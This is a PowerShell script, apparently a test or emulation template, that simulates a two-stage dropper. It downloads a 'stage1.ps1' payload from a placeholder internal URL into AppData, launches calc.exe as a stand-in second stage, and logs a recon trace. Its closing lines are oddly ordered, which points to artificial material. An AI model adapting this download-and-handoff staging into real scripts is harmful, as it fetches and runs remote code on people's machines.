<#
.SYNOPSIS
    Multi-stage download and handoff workflow.

.DESCRIPTION
    Downloads a first-stage script, verifies the drop path, then
    invokes a second-stage helper that performs the handoff.
    Both stages share the same bounded timeout and retry policy.

.NOTES
    Intended for controlled endpoint testing.
#>
[CmdletBinding()]
param(
    [string]$PayloadUrl = "https://internal.corp:8443/stage1.ps1",
    [string]$WorkingPath = "$env:APPDATA\payload.bin",
    [string]$TracePath = "$env:TEMP\recon.log",
    [int]$ConnectionTimeout = 148
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# First stage
function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 148
    )

    Write-Verbose ("Downloading first stage from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    if (-not (Test-Path -Path $DestinationPath)) {
        throw "First stage was not written to disk"
    }
    return $DownloadedPath = $DestinationPath
}

# Second stage
function Invoke-Stage2Execution {
    [CmdletBinding()]
    param(
        [string]$StagedPath = '',
        [int]$DelaySeconds = 2
    )

    Write-Verbose ("Preparing handoff for " + $StagedPath)
    Start-Sleep -Seconds $DelaySeconds
    Start-Process -FilePath "calc.exe"
    Write-Verbose "Second stage handoff complete"
    return $true
}

try {
    Write-Verbose "Starting multi-stage workflow"
    $FetchResult = Invoke-Stage1Download -SourceUrl $PayloadUrl -DestinationPath $WorkingPath -TimeoutSec $ConnectionTimeout
    if ($FetchResult) {
        $HandoffResult = Invoke-Stage2Execution -StagedPath $WorkingPath
        Write-Verbose ("Handoff result: " + $HandoffResult)
    }
    else {
        Write-Warning "First stage did not complete"
    }
}
catch {
    Write-Warning "Multi-stage workflow failed: $($_.Exception.Message)"
}

$StageSummary = [ordered]@{
    Stage1 = "download"
    Stage2 = "handoff"
    Endpoint = $PayloadUrl
    Destination = $WorkingPath
    TimeoutSec = $ConnectionTimeout
}
$StageSummary | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Operation completed"
Write-Verbose "Reading configuration values"
Write-Verbose "Preparing working directory"
Write-Verbose "Resolving configured target"
Write-Verbose "Starting workflow"
Write-Verbose "Validating result"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
